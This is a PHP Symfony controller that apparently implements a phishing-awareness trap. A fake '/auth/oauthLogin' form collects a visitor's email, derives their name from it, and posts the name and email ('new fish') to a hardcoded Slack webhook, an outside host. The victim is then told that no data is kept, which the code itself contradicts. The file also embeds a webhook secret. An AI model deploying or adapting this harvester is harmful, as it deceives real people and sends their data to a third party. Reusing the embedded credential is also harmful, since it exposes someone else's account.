<?php

namespace App\Controller;

use App\Form\FormType;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Contracts\HttpClient\Exception\ClientExceptionInterface;
use Symfony\Contracts\HttpClient\Exception\RedirectionExceptionInterface;
use Symfony\Contracts\HttpClient\Exception\ServerExceptionInterface;
use Symfony\Contracts\HttpClient\Exception\TransportExceptionInterface;
use Symfony\Contracts\HttpClient\HttpClientInterface;

class FormController extends AbstractController
{
    private const URL_WEBHOOK = 'https://hooks.slack.com/services/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';
    private HttpClientInterface $client;

    public function __construct(HttpClientInterface $client)
    {
        $this->client = $client;
    }

    #[Route('/auth/oauthLogin', name: 'app_form')]
    public function login(Request $request): Response
    {
        $form = $this->createForm(FormType::class);
        $form->handleRequest($request);
        if ($form->isSubmitted() && $form->isValid()) {
            $data['email'] = $form->getData()['email'];
            return $this->redirectToRoute(
                'app_attacked',
                $data,
                Response::HTTP_MOVED_PERMANENTLY
            );
        }

        return $this->render('form/index.html.twig', [
            'controller_name' => 'FormController',
            'form' => $form->createView()
        ]);
    }

    #[Route('/attacked', name: 'app_attacked')]
    public function attacked(Request $request): Response
    {
        $text = "Salut %s %s ! Tu viens d'être attaqué par une cyberattaque créée de toute pièces par Jhack Chirac ! Pas de panique, aucune donnée n'est conservée et tu n'as aucune crainte à avoir !";
        $email = $request->query->get('email');
        $formattedEmail = strtok($email, '@');
        $emailExploded = explode('.', $formattedEmail);

        if (count($emailExploded) === 2) {
            $firstName = ucwords(str_replace('-', ' ', array_shift($emailExploded)));
            $lastName = ucwords(str_replace('-', ' ', end($emailExploded)));
            $text = sprintf($text, $lastName, $firstName);

            try {
                $payload['text'] = sprintf(
                    'Nouveau poisson ! %s %s s\'est fait avoir par Jhack Chirac ! Son email : %s',
                    $lastName,
                    $firstName,
                    $email
                );

                $this->client->request(
                    'POST',
                    self::URL_WEBHOOK,
                    [
                        'json' => $payload,
                    ]
                );

            } catch (\Exception $e) {
                error_log($e->getMessage());
            } catch (TransportExceptionInterface $e) {
                error_log($e->getMessage());
            }
        }

        return $this->render('form/trapped.html.twig', [
            'text' => $text
        ]);
    }
}
